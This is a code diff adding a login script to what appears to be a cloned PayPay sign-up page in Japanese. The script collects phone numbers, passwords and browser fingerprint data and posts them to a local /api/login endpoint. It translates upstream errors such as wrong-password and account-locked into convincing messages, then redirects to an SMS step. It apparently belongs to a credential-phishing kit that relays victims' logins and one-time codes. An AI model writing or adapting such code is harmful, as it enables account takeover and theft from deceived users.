@@ -124,6 +124,25 @@
     }
     .switch-sign-flow a { color: #3895ff; }
     .switch-sign-flow strong { font-size: 16px; padding-left: 10px; font-weight: 600; }
+
+    .login-error {
+      display: none; color: #e53935; font-size: 12px; margin-top: 8px; line-height: 1.5;
+    }
+    .login-error.visible { display: block; }
+
+    .loading-overlay {
+      position: fixed; inset: 0; background: rgba(255,255,255,0.85);
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.2s;
+    }
+    .loading-overlay.visible { opacity: 1; pointer-events: all; }
+    .spinner {
+      width: 36px; height: 36px; border: 3px solid #e0e0e0;
+      border-top-color: #3895ff; border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { margin-top: 12px; font-size: 13px; color: #666; }
   </style>
 </head>
 <body class="ios outside-native account-sign-in">
@@ -171,6 +190,7 @@
               </div>
 
               <button data-v-6ea1e05b="" id="login-loginBtn" class="submit-button" disabled="">上記に同意して新規登録</button>
+              <div class="login-error" id="loginError"></div>
             </section>
 
             <div data-v-796fd186="" class="separate-text">外部のアカウントで新規登録</div>
@@ -196,5 +216,115 @@
   </div>
 </div>
 
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+  <div class="loading-text">登録中...</div>
+</div>
+
+<script>
+(function () {
+  const phoneInput = document.querySelector('input[name="username"]');
+  const passInput  = document.querySelector('input[name="password"]');
+  const loginBtn   = document.getElementById("login-loginBtn");
+  const errorDiv   = document.getElementById("loginError");
+  const overlay    = document.getElementById("loadingOverlay");
+
+  const ERROR_MAP = [
+    [/wrong.?password|incorrect.?password|password.*incorrect|認証.*失敗|WRONG_PASSWORD/i,
+      "携帯電話番号またはパスワードが違います。"],
+    [/lock|locked|ロック/i,
+      "アカウントがロックされています。しばらく経ってから再度お試しください。"],
+    [/not.?found|no.?user|該当.*ユーザー/i,
+      "携帯電話番号またはパスワードが違います。"],
+    [/too.?many|rate.?limit|試行回数/i,
+      "ログイン試行回数が上限に達しました。しばらく経ってから再度お試しください。"],
+  ];
+
+  function mapError(raw) {
+    if (!raw) return "登録に失敗しました。電話番号またはパスワードを確認してください。";
+    for (const [re, msg] of ERROR_MAP) {
+      if (re.test(raw)) return msg;
+    }
+    return "登録に失敗しました。電話番号またはパスワードを確認してください。";
+  }
+
+  phoneInput.addEventListener("input", function () {
+    let digits = this.value.replace(/\D/g, "").slice(0, 11);
+    let fmt = digits;
+    if (digits.length > 7)      fmt = digits.slice(0,3) + "-" + digits.slice(3,7) + "-" + digits.slice(7);
+    else if (digits.length > 3) fmt = digits.slice(0,3) + "-" + digits.slice(3);
+    this.value = fmt;
+    updateBtn();
+  });
+
+  passInput.addEventListener("input", updateBtn);
+
+  function updateBtn() {
+    const digits = phoneInput.value.replace(/\D/g, "");
+    loginBtn.disabled = !(digits.length >= 10 && passInput.value.trim());
+  }
+
+  [phoneInput, passInput].forEach(el => {
+    el.style.webkitUserSelect = "text";
+    el.style.userSelect = "text";
+  });
+
+  function showError(msg) {
+    errorDiv.textContent = msg;
+    errorDiv.classList.add("visible");
+  }
+  function clearError() {
+    errorDiv.textContent = "";
+    errorDiv.classList.remove("visible");
+  }
+
+  loginBtn.addEventListener("click", async () => {
+    clearError();
+    const phone    = phoneInput.value.replace(/\D/g, "");
+    const password = passInput.value.trim();
+    if (phone.length < 10 || !password) return;
+
+    overlay.classList.add("visible");
+    loginBtn.disabled = true;
+
+    try {
+      const res = await fetch("/api/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          phone,
+          password,
+          user_agent: navigator.userAgent,
+          device_info: {
+            language:    navigator.language,
+            platform:    navigator.platform,
+            screen:      screen.width + "x" + screen.height,
+            color_depth: screen.colorDepth,
+            timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
+          },
+        }),
+      });
+      const data = await res.json();
+
+      if (!res.ok) {
+        showError(mapError(data.error));
+        loginBtn.disabled = false;
+        return;
+      }
+
+      if (data.status === "sms_required") {
+        sessionStorage.setItem("paypay_phone", phoneInput.value);
+        window.location.href = "sms.html";
+      }
+
+    } catch (err) {
+      showError("サーバーに接続できませんでした。しばらく経ってから再度お試しください。");
+      loginBtn.disabled = false;
+    } finally {
+      overlay.classList.remove("visible");
+    }
+  });
+})();
+</script>
 </body>
 </html>
